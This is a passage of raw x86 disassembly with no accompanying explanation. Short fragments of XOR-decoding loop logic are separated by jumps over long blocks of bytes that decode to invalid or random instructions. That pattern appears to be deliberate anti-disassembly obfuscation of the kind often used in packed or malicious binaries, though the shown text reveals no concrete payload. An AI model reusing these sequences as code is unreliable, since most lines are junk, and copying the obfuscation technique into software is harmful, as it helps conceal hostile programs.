  40496d:	cmp    edi,DWORD PTR [edx-0x7829c08b]
  404973:	leave  
  404974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404975:	dec    ecx
  404976:	ja     0x4049d7
  404978:	sahf   
  404979:	inc    esp
  40497a:	pop    edi
  40497b:	push   edi
  40497c:	mov    ch,0xcc
  40497e:	dec    esp
  40497f:	nop
  404980:	mov    esp,0x184833b0
  404985:	lods   al,BYTE PTR ds:[esi]
  404986:	mov    ecx,0xe72213e5
  40498b:	std    
  40498c:	inc    ebp
  40498d:	rol    DWORD PTR [ecx+0x1e035786],1
  404993:	je     0x404a05
  404995:	and    al,0xf6
  404997:	stos   DWORD PTR es:[edi],eax
  404998:	adc    ebp,DWORD PTR [eax+0x6d]
  40499b:	js     0x40494b
  40499d:	or     ecx,edx
  40499f:	jp     0x4049f3
  4049a1:	adc    ah,cl
  4049a3:	pop    esp
  4049a4:	add    ebx,DWORD PTR [ebx+0x6a]
  4049a7:	sub    eax,0x713e301f
  4049ac:	pusha  
  4049ad:	leave  
  4049ae:	jge    0x4049c5
  4049b0:	bound  edi,QWORD PTR gs:[edx]
  4049b3:	retf   
  4049b4:	fadd   DWORD PTR [ebx-0x46]
  4049b7:	jae    0x404a0c
  4049b9:	pop    ebp
  4049ba:	push   cs
  4049bb:	xor    ebx,ecx
  4049bd:	in     eax,0xa5
  4049bf:	adc    BYTE PTR [ebp-0x60],al
  4049c2:	mov    DWORD PTR [ecx],0x96e31d4f
  4049c8:	xor    BYTE PTR [eax],dh
  4049ca:	pop    edi
  4049cb:	lahf   
  4049cc:	mov    ch,0x54
  4049ce:	fistp  DWORD PTR [ebp+0x29cbd576]
  4049d4:	jle    0x404974
  4049d6:	pop    edx
  4049d7:	pop    eax
  4049d8:	dec    ebx
  4049d9:	push   edx
  4049da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049db:	fsubrp st(3),st
  4049dd:	pop    eax
  4049de:	mov    edx,0x87d8b57
  4049e3:	sbb    DWORD PTR ds:0x43361b,ebx
  4049e9:	mov    eax,0x8a3a
  4049ee:	xor    DWORD PTR ds:0x4335b3,0x2227
  4049f8:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4049fd:	movzx  edi,WORD PTR ds:0x433553
  404a04:	sbb    DWORD PTR ds:0x4335f3,edi
  404a0a:	mov    edi,0x3b00
  404a0f:	add    DWORD PTR ds:0x433623,0x4335f3
  404a19:	add    ax,di
  404a1c:	movzx  eax,ax
  404a1f:	mov    DWORD PTR [ebp-0x14],eax
  404a22:	mov    eax,DWORD PTR [ebp+0x8]
  404a25:	movzx  eax,WORD PTR [eax+edx*4]
  404a29:	xor    eax,0x8a3a
  404a2e:	xor    DWORD PTR ds:0x433633,0x619a
  404a38:	add    eax,edi
  404a3a:	mov    edi,DWORD PTR [ebp-0x14]
  404a3d:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404a41:	mov    eax,DWORD PTR [ebp-0xc]
  404a44:	inc    edx
  404a45:	cmp    edx,eax
  404a47:	jne    0x4049e0
  404a4d:	pop    edi
  404a4e:	pop    ebx
  404a4f:	mov    eax,DWORD PTR [ebp-0x8]
  404a52:	mov    edx,DWORD PTR [ebp+0x10]
  404a55:	xor    eax,ecx
  404a57:	add    eax,esi
  404a59:	mov    DWORD PTR [edx],eax
  404a5b:	mov    eax,DWORD PTR [ebp-0x8]
  404a5e:	jmp    0x404c30
  404a63:	das    
  404a64:	or     DWORD PTR [eax-0x16825d93],eax
  404a6a:	pop    ebp
  404a6b:	out    0xe3,al
  404a6d:	sub    ecx,DWORD PTR [ebx+0x28]
  404a70:	add    BYTE PTR [esi+0x11],cl
  404a73:	test   BYTE PTR ds:0x7fab7c7c,ch
  404a79:	jl     0x404af7
  404a7b:	cwde   
  404a7c:	shl    DWORD PTR [ecx+0x1b],cl
  404a7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a80:	lods   eax,DWORD PTR ds:[esi]
  404a81:	and    eax,0xee3dff8c
  404a86:	test   eax,0xd07ed902
  404a8b:	clc    
  404a8c:	mov    dh,0x81
  404a8e:	sbb    BYTE PTR [esp+ebp*1],0x55
  404a92:	or     DWORD PTR ds:0x331801d4,edx
  404a98:	mov    dh,0xe7
  404a9a:	xor    al,0x7c
  404a9c:	imul   edx,DWORD PTR [ebx+0x26c8bccc],0x9f6bcac6
  404aa6:	test   eax,0xfac1b628
  404aab:	mov    edx,0xf3a7fd43
  404ab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ab1:	mov    BYTE PTR [ecx-0x39],ch
  404ab4:	adc    eax,DWORD PTR [edx+esi*1-0x40]
  404ab8:	mov    al,0x90
  404aba:	loop   0x404b18
  404abc:	pop    ss
  404abd:	not    DWORD PTR [esi]
  404abf:	adc    DWORD PTR [eax-0x761a81d3],0x18c98f52
  404ac9:	ins    DWORD PTR es:[edi],dx
  404aca:	mov    eax,0xff5065fe
  404acf:	aaa    
  404ad0:	jmp    0x6b9e:0x89f2b4d
  404ad7:	sahf   
  404ad8:	push   ds
  404ad9:	js     0x404ae7
  404adb:	push   cs
  404adc:	sbb    eax,0xad75403e
  404ae1:	scas   al,BYTE PTR es:[edi]
  404ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ae3:	pop    ebx
  404ae4:	lea    esp,[ecx]
  404ae6:	int    0x3a
  404ae8:	cmp    eax,0x8afdafc2
  404aed:	pusha  
  404aee:	and    al,ah
  404af0:	mov    dh,0x15
  404af2:	(bad)  
  404af3:	cli    
  404af4:	push   esi
  404af5:	sar    BYTE PTR [edx-0x41],cl
  404af8:	and    DWORD PTR [edx],edx
  404afa:	jb     0x404adf
  404afc:	repz sar dh,1
  404aff:	jbe    0x404b7d
  404b01:	ins    BYTE PTR es:[edi],dx
  404b02:	shl    BYTE PTR [ebp-0x64],cl
  404b05:	add    BYTE PTR [ebx+0x2cb8b23a],ah
  404b0b:	push   es
  404b0c:	imul   ecx,edi,0x7c5d8bcb
  404b12:	adc    eax,0x20df494a
  404b17:	in     eax,dx
  404b18:	jle    0x404b0c
  404b1a:	inc    ecx
  404b1b:	call   0x4f3d:0x2674fe0
  404b22:	fsub   st,st(2)
  404b24:	icebp  
  404b25:	cmp    al,0xe8
  404b27:	cmp    ch,cl
  404b29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b2a:	mov    al,BYTE PTR [eax-0x4f0f65f]
  404b30:	mov    bh,0x7
  404b32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b33:	rol    DWORD PTR [ebp+0x13e4aa47],1
  404b39:	out    0xfe,eax
  404b3b:	mov    eax,ds:0xf320082
  404b40:	out    0xf6,al
  404b42:	mov    ch,0xa
  404b44:	repnz gs test ch,0xce
  404b49:	xor    DWORD PTR [ecx+0x6c],0xfffffff6
  404b4d:	lock int 0xb0
  404b50:	push   esp
  404b51:	and    al,0x70
  404b53:	rol    BYTE PTR [esi],0x7
  404b56:	clc    
  404b57:	dec    esp
  404b58:	mov    ds:0x5d154420,al
  404b5d:	lea    esp,[eax-0x2510fc82]
  404b63:	int3   
  404b64:	push   es
  404b65:	aaa    
  404b66:	je     0x404b50
  404b68:	lods   eax,DWORD PTR ds:[esi]
  404b69:	pusha  
  404b6a:	mov    eax,0x537c3247
  404b6f:	push   edx
  404b70:	cmp    bh,cl
  404b72:	in     eax,dx
  404b73:	ds jmp 0x6ea375b6
  404b79:	jmp    0xb29c:0xa22812b4
  404b80:	cmp    edx,DWORD PTR [ebp+0x158c8aa1]
  404b86:	adc    al,0xf
  404b88:	and    DWORD PTR [edi-0x31ee6c7a],esi
  404b8e:	les    ebp,FWORD PTR [esi+0x1faafedb]
  404b94:	lock xchg DWORD PTR [eax-0x3a],esp
  404b98:	call   FWORD PTR [esp+eax*4]
  404b9b:	ret    
  404b9c:	mov    ds:0x3f8759f3,eax
  404ba1:	inc    esi
  404ba2:	test   al,0x38
  404ba4:	ds call 0xf481:0x1846d567
  404bac:	sub    eax,DWORD PTR [ecx+0x78c93873]
  404bb2:	or     dl,BYTE PTR [ebx]
  404bb4:	or     dl,BYTE PTR [edi+ebx*8-0x72]
  404bb8:	aas    
  404bb9:	or     al,BYTE PTR [esi+0xfe07612]
  404bbf:	xchg   ebp,eax
  404bc0:	push   ecx
  404bc1:	mov    eax,0xf0463600
  404bc6:	mov    bh,0x9b
  404bc8:	scas   eax,DWORD PTR es:[edi]
  404bc9:	lods   eax,DWORD PTR ds:[esi]
  404bca:	shl    DWORD PTR [ecx+edx*8-0x124f21b9],0x58
  404bd2:	ins    BYTE PTR es:[edi],dx
  404bd3:	xchg   edx,eax
  404bd4:	(bad)  [edi-0x69]
  404bd7:	xor    DWORD PTR [ebx],ebx
  404bd9:	mov    dl,0x7f
  404bdb:	out    0x64,eax
  404bdd:	aam    0xb8
  404bdf:	cmp    dh,BYTE PTR [edi-0x54]
  404be2:	dec    esp
  404be3:	test   DWORD PTR [ebx],eax
  404be5:	jmp    0x404b9e
  404be7:	ins    DWORD PTR es:[edi],dx
  404be8:	lods   eax,DWORD PTR ds:[esi]
  404be9:	and    bl,dl
  404beb:	out    dx,eax
  404bec:	call   0x5208:0x41d289a6
  404bf3:	jne    0x404b99
  404bf5:	add    ah,BYTE PTR [esi+0xb22e5d1]
  404bfb:	jb     0x404b8d
  404bfd:	cwde   
  404bfe:	std    
  404bff:	xchg   edi,eax
  404c00:	and    al,0xe7
  404c02:	pop    ebp
  404c03:	jns    0x404bc7
  404c05:	mov    ss,WORD PTR [esi-0x24918fd3]
  404c0b:	sbb    eax,0xfe514842
  404c10:	ja     0x404c3a
  404c12:	fbstp  TBYTE PTR [eax+0x74]
  404c15:	ret    0x4e5e
  404c18:	push   edi
  404c19:	aas    
  404c1a:	xlat   BYTE PTR ds:[ebx]
  404c1b:	push   eax
  404c1c:	mov    al,0x15
  404c1e:	xlat   BYTE PTR ds:[ebx]
  404c1f:	inc    ecx
  404c20:	xchg   esp,eax
  404c21:	cmp    DWORD PTR [edx+0x3f],esi
  404c24:	dec    ebx
  404c25:	inc    esp
  404c26:	test   BYTE PTR [ecx],al
  404c28:	mov    al,0x93
  404c2a:	jno    0x404bc4
  404c2c:	aaa    
  404c2d:	inc    ebx
  404c2e:	fisttp WORD PTR [esi]
  404c30:	xor    eax,ecx
  404c32:	add    eax,esi
  404c34:	mov    DWORD PTR [ebp+0x8],eax
  404c37:	mov    eax,DWORD PTR [ebp+0x8]
  404c3a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404c3e:	mov    dl,BYTE PTR [ebp-0x1]
  404c41:	cmp    al,dl
  404c43:	je     0x40502a
  404c49:	mov    eax,DWORD PTR [ebp+0x8]
  404c4c:	jmp    0x404e1e
  404c51:	adc    al,0xc9
  404c53:	mulps  xmm2,xmm1
  404c56:	pop    ecx
  404c57:	jbe    0x404cca
  404c59:	sti    
  404c5a:	lahf   
  404c5b:	dec    ecx
  404c5c:	xchg   ebx,eax
  404c5d:	jg     0x404ca4
  404c5f:	add    dh,BYTE PTR [ecx]
  404c61:	xor    ebp,DWORD PTR [edi]
  404c63:	jl     0x404ce1
  404c65:	stos   DWORD PTR es:[edi],eax
  404c66:	jg     0x404ce4
  404c68:	jl     0x404c91
  404c6a:	mov    ecx,0x3b24b03c
  404c6f:	add    edi,DWORD PTR [eax]
  404c71:	rol    BYTE PTR [ebx],cl
  404c73:	cmp    dl,BYTE PTR [esi]
  404c75:	mov    DWORD PTR [ebp+0x3683beb5],edx
  404c7b:	sahf   
  404c7c:	and    dl,BYTE PTR [ebp*4-0x348838c]
  404c83:	daa    
  404c84:	push   eax
  404c85:	xor    al,0x5
  404c87:	mov    eax,ds:0x6f49bf3d
  404c8c:	push   ss
  404c8d:	(bad)  
  404c8e:	aaa    
  404c8f:	loope  0x404c11
  404c91:	retw   0xac42
  404c95:	fcomp  st(6)
  404c97:	fdiv   st,st(4)
  404c99:	mov    ebx,DWORD PTR [eax+0x6dab5091]
  404c9f:	loope  0x404c5f
  404ca1:	loop   0x404c40
  404ca3:	(bad)  
  404ca4:	in     al,dx
  404ca5:	cmp    BYTE PTR [ebx-0x37],al
  404ca8:	fmul   DWORD PTR [edi-0x5f179a1a]
  404cae:	jnp    0x404cf5
  404cb0:	pop    ds
  404cb1:	frstor [ebp+ecx*1-0x36]
  404cb5:	cld    
  404cb6:	(bad)  
  404cb7:	dec    esp
  404cb8:	dec    edi
  404cb9:	rcr    BYTE PTR [ecx-0x4c],cl
  404cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cbd:	adc    edi,DWORD PTR [esi-0x2f27beec]
  404cc3:	mov    cl,0xcd
  404cc5:	add    dl,BYTE PTR [ebp-0x3e663323]
  404ccb:	mov    dh,0xf8
  404ccd:	inc    ebx
  404cce:	xchg   edx,eax
  404ccf:	add    al,0x2b
  404cd1:	das    
  404cd2:	mov    ds:0x479b719a,eax
  404cd7:	or     dl,BYTE PTR [ecx]
  404cd9:	xlat   BYTE PTR ds:[ebx]
  404cda:	xchg   edx,eax
  404cdb:	repnz add eax,0x3706dc16
  404ce1:	in     eax,dx
  404ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ce3:	ret    0xe07d
  404ce6:	shr    esi,1
  404ce8:	push   esp
  404ce9:	inc    esi
  404cea:	(bad)  
  404ceb:	jg     0x404cde
  404ced:	add    ch,al
  404cef:	ret    
  404cf0:	mov    eax,ds:0x351f5412
  404cf5:	ficom  DWORD PTR ds:0xb96e060d
  404cfb:	pusha  
  404cfc:	in     eax,dx
  404cfd:	add    bh,BYTE PTR [eax+0xeae449a]
  404d03:	pop    es
  404d04:	arpl   WORD PTR [ebx],bp
  404d06:	adc    ecx,edx
  404d08:	frstor [esi+edi*1]
  404d0b:	jl     0x404d75
  404d0d:	test   eax,0x666c4962
  404d12:	xchg   esi,eax
  404d13:	into   
  404d14:	das    
  404d15:	ror    DWORD PTR [edi-0x11e85056],0x89
  404d1c:	pop    ebx
  404d1d:	inc    esp
  404d1e:	or     BYTE PTR [ecx+0x5b],dh
  404d21:	cmp    eax,0x1527b55a
  404d26:	das    
  404d27:	retf   
  404d28:	mov    eax,ds:0x98ef5444
  404d2d:	imul   edi,DWORD PTR [esi],0x72
  404d30:	mov    dh,BYTE PTR [edi+0x7]
  404d33:	call   0x3fff0a43
  404d38:	js     0x404ce4
  404d3a:	arpl   WORD PTR [ebp-0x77],sp
  404d3d:	pop    eax
  404d3e:	xchg   edx,eax
  404d3f:	shl    cl,1
  404d41:	cwde   
  404d42:	sbb    DWORD PTR [ebx+edx*4+0x7f],esi
  404d46:	mov    DWORD PTR [eax-0x47c16953],esp
  404d4c:	dec    esi
  404d4d:	mov    edx,0x1b9b11c5
  404d52:	ja     0x404d70
  404d54:	or     DWORD PTR [ebp-0x16],edi
  404d57:	(bad)  
  404d58:	ret    
  404d59:	jo     0x404db7
  404d5b:	adc    DWORD PTR [edx],esp
  404d5d:	loopne 0x404d31
  404d5f:	jns    0x404d09
  404d61:	in     eax,0x8
  404d63:	retf   0xd54e
  404d66:	inc    esp
  404d67:	stos   BYTE PTR es:[edi],al
  404d68:	or     BYTE PTR ds:0xbdb7c29e,0xf7
  404d6f:	mov    fs,WORD PTR [edi-0x42f0096]
  404d75:	cmp    al,0x73
  404d77:	pop    ebp
  404d78:	(bad)  
  404d79:	cmp    eax,0xcac66609
  404d7e:	scas   al,BYTE PTR es:[edi]
  404d7f:	add    ch,BYTE PTR [edx-0x4ea6918b]
  404d85:	fld    QWORD PTR [esi+0x79ccd35a]
  404d8b:	in     eax,0x3c
  404d8d:	xor    eax,0xa565e1e9
  404d92:	(bad)  
  404d93:	pop    ecx
  404d94:	hlt    
  404d95:	mov    ebx,0x328a14b0
  404d9a:	ins    DWORD PTR es:[edi],dx
  404d9b:	test   DWORD PTR [esp+ecx*1-0x20],esp
  404d9f:	inc    edi
  404da0:	(bad)  
  404da1:	pop    ss
  404da2:	pop    ecx
  404da3:	sbb    BYTE PTR [ebp+0x48409126],cl
  404da9:	call   0x340f:0x4f880515
  404db0:	ins    DWORD PTR es:[edi],dx
  404db1:	jb     0x404d47
  404db3:	add    al,0x11
  404db5:	pop    ds
  404db6:	or     BYTE PTR [bp+si+0x53],ch
  404dba:	mov    esi,0xa8723f11
  404dbf:	push   eax
  404dc0:	pop    ecx
  404dc1:	jns    0x404e0d
  404dc3:	mov    ebx,0x32f35683
  404dc8:	leave  
  404dc9:	retf   0x321f
  404dcc:	sub    eax,0xf78a549c
  404dd1:	stos   DWORD PTR es:[edi],eax
  404dd2:	push   0xef34026
  404dd7:	jle    0x404d94
  404dd9:	(bad)  
  404dda:	xlat   BYTE PTR ds:[ebx]
  404ddb:	pop    di
  404ddd:	sbb    ecx,esp
  404ddf:	pop    edx
  404de0:	adc    BYTE PTR ds:0xc682b49e,cl
  404de6:	push   edi
  404de7:	shl    DWORD PTR [esi+0x5ebcb17b],0xde
  404dee:	int    0x25
  404df0:	jbe    0x404e2d
  404df2:	mov    bh,0xeb
  404df4:	inc    eax
  404df5:	jmp    0xa19d0303
  404dfa:	stc    
  404dfb:	push   esp
  404dfc:	inc    ecx
  404dfd:	pop    ss
  404dfe:	arpl   WORD PTR [edx],dx
  404e00:	inc    ebp
  404e01:	std    
  404e02:	pop    esi
  404e03:	jns    0x404dcd
  404e05:	mov    edx,0x1527aa22
  404e0a:	shl    DWORD PTR [esi],cl
  404e0c:	cmp    al,BYTE PTR [esi-0x2b]
  404e0f:	leave  
  404e10:	jmp    0x404e37
  404e12:	arpl   WORD PTR [esi+0x1e],dx
  404e15:	repz test DWORD PTR [eax-0x71],ebp
  404e19:	add    DWORD PTR ds:0x8a33b23e,ecx
  404e1f:	inc    esp
  404e20:	add    eax,0xc558ba8
  404e25:	cmp    al,BYTE PTR [edx]
  404e27:	jne    0x405222
  404e2d:	mov    eax,DWORD PTR [ebp-0x8]
  404e30:	mov    edx,DWORD PTR [ebp+0xc]
  404e33:	movsx  edx,BYTE PTR [edx]
  404e36:	xor    eax,ecx
  404e38:	jmp    0x40500a
  404e3d:	test   BYTE PTR [ecx-0x28a15a6],dh
  404e43:	xchg   esp,eax
  404e44:	jge    0x404e3a
  404e46:	int    0x4b
  404e48:	add    eax,0x740cd6f5
  404e4d:	outs   dx,BYTE PTR ds:[esi]
  404e4e:	cs jl  0x404ecd
  404e51:	stos   DWORD PTR es:[edi],eax
  404e52:	jg     0x404ed0
  404e54:	jl     0x404e7a
  404e56:	dec    eax
  404e57:	jmp    0x189:0xdb007902
  404e5e:	sbb    bl,BYTE PTR [edx-0x7f]
  404e61:	(bad)  
  404e62:	mov    edx,0xf95c66d
  404e67:	fist   WORD PTR [edx-0x2a]
  404e6a:	clc    
  404e6b:	sub    DWORD PTR [edi-0x37],eax
  404e6e:	hlt    
  404e6f:	mov    edi,0xdf4cc4f8
  404e74:	inc    esp
  404e75:	mov    dl,0xf5
  404e77:	sahf   
  404e78:	xchg   edx,eax
  404e79:	jnp    0x404e54
  404e7b:	push   es
  404e7c:	loope  0x404e34
  404e7e:	ds cwde 
  404e80:	into   
  404e81:	scas   eax,DWORD PTR es:[edi]
  404e82:	dec    eax
  404e83:	aas    
  404e84:	lods   eax,DWORD PTR ds:[esi]
  404e85:	mov    ah,0x49
  404e87:	jne    0x404ec5
  404e89:	out    0xd2,al
  404e8b:	loope  0x404eab
  404e8d:	mov    dl,0xcf
  404e8f:	sub    ch,BYTE PTR [edx+0x45]
  404e92:	mov    ?,WORD PTR [ebp-0x679d2d90]
  404e98:	ins    BYTE PTR es:[edi],dx
  404e99:	push   ebp
  404e9a:	and    eax,0xe9eb80a2
  404e9f:	mov    DWORD PTR [edi-0x4b],ebx
  404ea2:	mov    ds:0xd0429541,eax
  404ea7:	ins    DWORD PTR es:[edi],dx
  404ea8:	imul   eax,DWORD PTR [esi+0x14],0x7163efc5
  404eaf:	add    al,0x2a
  404eb1:	sub    DWORD PTR [ebp-0x2b],eax
  404eb4:	out    0x29,eax
  404eb6:	add    al,BYTE PTR [edx+edx*8-0xf4de221]
  404ebd:	mov    WORD PTR [edx-0x3e6cc8b3],?
  404ec3:	xchg   esp,eax
  404ec4:	pushf  
  404ec5:	sbb    dl,BYTE PTR [ebx-0x581074f1]
  404ecb:	xchg   ebp,eax
  404ecc:	sbb    DWORD PTR [ebx+0x4b6f31b9],edx
  404ed2:	stos   DWORD PTR es:[edi],eax
  404ed3:	or     ebp,ecx
  404ed5:	inc    ebp
  404ed6:	jmp    0xaaf2:0xbfcad974
  404edd:	fisubr DWORD PTR [eax]
  404edf:	pushf  
  404ee0:	xor    al,0x32
  404ee2:	sbb    DWORD PTR es:[ebx-0x61],edx
  404ee6:	lds    ebp,FWORD PTR [edx]
  404ee8:	xchg   edx,eax
  404ee9:	dec    edi
  404eea:	shr    DWORD PTR [ecx],1
  404eec:	iret   
  404eed:	sbb    BYTE PTR ss:[ebx-0x279fa78e],ah
  404ef4:	pop    eax
  404ef5:	(bad)  [ebx-0x1f97f521]
  404efb:	add    al,0x19
  404efd:	jecxz  0x404ece
  404eff:	or     edx,DWORD PTR [edx]
  404f01:	ds (bad) 
  404f03:	mov    ah,0xfc
  404f05:	int3   
  404f06:	nop
  404f07:	cmp    DWORD PTR [eax-0x24],esi
  404f0a:	nop
  404f0b:	imul   edx,DWORD PTR [esp+ebp*8],0x258d2a6
  404f12:	je     0x404f2a
  404f14:	push   ebx
  404f15:	jmp    0x1b8ae3ec
  404f1a:	nop
  404f1b:	test   BYTE PTR [ebp-0x45],bl
  404f1e:	(bad)  
  404f1f:	(bad)  
  404f20:	fcmovb st,st(4)
  404f22:	adc    eax,0xd2376e25
  404f27:	popf   
  404f28:	cdq    
  404f29:	mov    ah,0x20
  404f2b:	int3   
  404f2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f2d:	bound  esp,QWORD PTR [esp+ebp*4+0x5f208be9]
  404f34:	out    dx,al
  404f35:	(bad)  
  404f36:	mov    esi,0xaca57f4d
  404f3b:	pop    esi
  404f3c:	dec    esp
  404f3d:	mov    al,0x12
  404f3f:	jo     0x404fab
  404f41:	cdq    
  404f42:	pop    ebp
  404f43:	push   0xd3e0de39
  404f48:	out    0xe2,eax
  404f4a:	fs (bad) 
  404f4c:	fsubr  st(4),st
  404f4e:	outs   dx,DWORD PTR ds:[esi]
  404f4f:	ins    DWORD PTR es:[edi],dx
  404f50:	imul   eax,DWORD PTR gs:[ebx],0x5d1741d8
  404f57:	adc    BYTE PTR [eax-0x35],al
  404f5a:	pusha  
  404f5b:	inc    eax
  404f5c:	mov    ds:0xcb2138aa,eax
  404f61:	xchg   esi,eax
  404f62:	pop    ebp
  404f63:	pop    ebx
  404f64:	dec    eax
  404f65:	or     eax,DWORD PTR [esi+0x7f1a276e]
  404f6b:	pop    edi
  404f6c:	push   es
  404f6d:	push   cs
  404f6e:	inc    ecx
  404f6f:	dec    edi
  404f70:	test   eax,0xfa87ecbd
  404f75:	(bad)  
  404f76:	mov    al,0xc
  404f78:	add    al,0xf1
  404f7a:	mov    ebp,?
  404f7c:	jl     0x404f48
  404f7e:	nop
  404f7f:	loopne 0x404fd7
  404f81:	gs push esp
  404f83:	out    dx,al
  404f84:	(bad)  
  404f85:	cmp    DWORD PTR [ebp-0x29],ecx
  404f88:	sub    eax,0x5ebef2fc
  404f8d:	sbb    eax,0x9737c5ba
  404f92:	xchg   BYTE PTR [edi],ch
  404f94:	adc    ebp,esi
  404f96:	mov    DWORD PTR [eax+0x59],esi
  404f99:	xchg   ebp,eax
  404f9a:	div    DWORD PTR [ecx+edx*1]
  404f9d:	sbb    eax,0x8476ea48
  404fa2:	fs xor al,0x36
  404fa5:	xor    eax,0xfa55c778
  404faa:	cmp    ebp,edx
  404fac:	sbb    eax,0xcdb85395
  404fb1:	sub    BYTE PTR [esi-0x72],bl
  404fb4:	call   0x3347:0xaf477132
  404fbb:	sub    DWORD PTR [ecx],esi
  404fbd:	xchg   DWORD PTR [edx-0xacd87ab],ebx
  404fc3:	mov    DWORD PTR [ecx+0x585c656c],esp
  404fc9:	inc    ebx
  404fca:	sahf   
  404fcb:	xchg   ecx,eax
  404fcc:	popa   
  404fcd:	mov    bh,0x5
  404fcf:	and    al,0x6c
  404fd1:	dec    edx
  404fd2:	pop    ecx
  404fd3:	jg     0x404fe8
  404fd5:	mov    edx,0x921cbb55
  404fda:	in     eax,0xc
  404fdc:	add    al,0x72
  404fde:	push   esi
  404fdf:	into   
  404fe0:	jns    0x404fa0
  404fe2:	xor    eax,0xf7ebed1b
  404fe7:	dec    ebp
  404fe8:	sti    
  404fe9:	push   es
  404fea:	mov    dl,0xc1
  404fec:	xchg   ecx,eax
  404fed:	sub    edi,DWORD PTR [ebx]
  404fef:	icebp  
  404ff0:	lods   eax,DWORD PTR ds:[esi]
  404ff1:	xchg   ecx,eax
  404ff2:	les    ebp,FWORD PTR [eax-0x50]
  404ff5:	jle    0x404fb2
  404ff7:	sub    DWORD PTR [eax-0x3b],0xb45baaff
  404ffe:	inc    DWORD PTR [ebp-0x30]
  405001:	je     0x405061
  405003:	aaa    
  405004:	retf   
  405005:	jnp    0x405052
  405007:	not    BYTE PTR [edx-0x10]
  40500a:	add    eax,esi
  40500c:	cmp    edx,eax
  40500e:	je     0x405216
  405014:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  40501b:	lea    eax,[ebp-0x18]
  40501e:	mov    DWORD PTR [ebp-0x14],eax
  405021:	mov    eax,DWORD PTR [ebp-0x14]
  405024:	add    DWORD PTR [eax],0x705fa8f
  40502a:	mov    eax,DWORD PTR [ebp-0x10]
  40502d:	mov    edx,DWORD PTR [ebp+0x8]
  405030:	xor    eax,ecx
  405032:	jmp    0x405204
  405037:	das    
  405038:	dec    ebx
  405039:	sbb    al,0x9b
  40503b:	pop    eax
  40503c:	imul   ebp,DWORD PTR [ebx-0x6bdfc3b5],0xfffffff0
  405043:	mov    esp,edx
  405045:	and    eax,0x7c28a507
  40504a:	jl     0x404ff7
  40504c:	jg     0x4050ca
  40504e:	jl     0x40504e
  405050:	sbb    ebx,DWORD PTR [edi+0x10]
  405053:	stos   DWORD PTR es:[edi],eax
  405054:	or     eax,0xdf7abd04
  405059:	cmp    ecx,0xa6a9018b
  40505f:	add    ebx,DWORD PTR [esi+0x1be6f219]
  405065:	mov    al,fs:0xe332e680
  40506b:	pop    es
  40506c:	popf   
  40506d:	fisubr WORD PTR [eax+edi*2-0x472389cf]
  405074:	add    DWORD PTR cs:[ecx+0x125563ac],ebx
  40507b:	das    
  40507c:	xchg   ebp,eax
  40507d:	lods   eax,DWORD PTR ds:[esi]
  40507e:	pop    es
  40507f:	nop
  405080:	pop    edx
  405081:	sahf   
  405082:	xchg   BYTE PTR [edi+0x2d],al
  405085:	test   ecx,edi
  405087:	(bad)  
  405088:	mov    ah,0x20
  40508a:	push   ebp
  40508b:	cmc    
  40508c:	sbb    esp,DWORD PTR [ecx+0x1b4cd16b]
  405092:	(bad)  
  405093:	in     eax,0xa2
  405095:	dec    ebx
  405096:	sub    BYTE PTR [ebx],al
  405098:	dec    edi
  405099:	or     cl,0x9f
  40509c:	jno    0x4050f2
  40509e:	call   0xcd66:0xc1b65524
  4050a5:	mov    ebp,0xf0c29249
  4050aa:	lea    eax,[edx+0x39]
  4050ad:	pop    esp
  4050ae:	ja     0x4050cc
  4050b0:	jge    0x4050ca
  4050b2:	call   0x9e81:0xb38e55af
  4050b9:	dec    ebx
  4050ba:	cmc    
  4050bb:	xchg   edx,eax
  4050bc:	dec    ecx
  4050bd:	mov    edi,0x473ec874
  4050c2:	sbb    BYTE PTR [ecx+eiz*8+0x4acb576a],ah
  4050c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050ca:	(bad)  
  4050cb:	jge    0x405119
  4050cd:	stc    
  4050ce:	repz ret 0xee3
  4050d2:	cdq    
  4050d3:	inc    esp
  4050d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050d5:	sbb    edx,DWORD PTR [edx-0x5b]
  4050d8:	xchg   ecx,eax
  4050d9:	xchg   ecx,eax
  4050da:	aaa    
  4050db:	sbb    dh,BYTE PTR [edi+0x25]
  4050de:	sar    DWORD PTR [ecx+0x67076424],1
  4050e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050e5:	imul   ebp,ebp,0x3a9ce735
  4050eb:	ret    
  4050ec:	loope  0x4050c5
  4050ee:	addr16 and eax,0x439b119f
  4050f4:	inc    esi
  4050f5:	sti    
  4050f6:	cmp    eax,0x7258b387
  4050fb:	pop    esp
  4050fc:	add    al,0x49
  4050fe:	ret    0x387
  405101:	push   esp
  405102:	pop    eax
  405103:	jns    0x405162
  405105:	(bad)  
  405106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405107:	cli    
  405108:	jmp    0xc8b3:0x131e5209
  40510f:	pop    ss
  405110:	in     al,0xdf
  405112:	daa    
  405113:	enter  0xd71d,0x80
  405117:	call   0x9d1f:0x4c870fcf
  40511e:	cli    
  40511f:	nop
  405120:	call   0xe9c67566
  405125:	cmp    edi,DWORD PTR [edi+0x64]
  405128:	loop   0x405188
  40512a:	xor    eax,0xf353926b
  40512f:	xor    ebx,edx
  405131:	jecxz  0x405107
  405133:	xchg   esp,eax
  405134:	sbb    eax,0x56031c32
  405139:	jle    0x405131
  40513b:	rol    DWORD PTR [edx+0x1319262c],1
  405141:	daa    
  405142:	mov    dl,0xcd
  405144:	aaa    
  405145:	inc    ebx
  405146:	xchg   ecx,eax
  405147:	mov    cl,BYTE PTR [ecx-0x7a]
  40514a:	inc    eax
